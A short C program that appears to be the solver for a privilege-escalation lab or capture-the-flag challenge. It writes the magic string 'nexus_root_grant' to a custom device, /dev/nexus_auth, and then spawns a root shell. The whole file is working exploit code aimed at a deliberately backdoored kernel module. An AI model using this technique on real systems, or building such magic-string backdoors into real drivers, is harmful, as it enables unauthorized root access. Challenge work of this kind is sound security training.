#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main() {
    printf("[*] T3-PRIVESC-03 Kernel Module Solver\n");
    printf("[*] Opening /dev/nexus_auth...\n");

    int fd = open("/dev/nexus_auth", O_WRONLY);
    if (fd < 0) {
        perror("[-] Failed to open device");
        return 1;
    }

    char *magic = "nexus_root_grant";
    printf("[*] Writing magic string: '%s'\n", magic);
    
    write(fd, magic, strlen(magic));
    close(fd);

    printf("[+] Execution elevated! Spawning root shell...\n");
    execl("/bin/sh", "sh", NULL);

    return 0;
}
